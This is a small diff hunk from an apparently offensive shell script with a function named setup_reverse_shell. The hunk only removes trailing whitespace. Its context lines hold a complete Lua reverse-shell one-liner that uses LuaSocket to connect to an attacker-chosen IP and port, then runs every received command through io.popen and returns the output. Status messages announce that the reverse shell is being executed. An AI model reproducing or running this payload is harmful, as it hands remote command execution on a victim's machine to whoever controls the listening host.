@@ -137,7 +137,7 @@ setup_reverse_shell() {
 			echo "[!] Checking for Lua..."
 			if command -v lua &>/dev/null; then
 				echo "[+] Lua is installed. Checking for LuaSocket..."
-				
+
 				if lua -e 'require("socket")' &>/dev/null; then
 					payload="export RHOST=$ip; export RPORT=$port; lua -e 'local s=require(\"socket\"); local t=assert(s.tcp()); t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\")); while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\")); local b=assert(f:read(\"*a\"));t:send(b); end; f:close();t:close();'"
 					echo "[+] Lua & LuaSocket are available. Executing reverse shell on $ip:$port..."
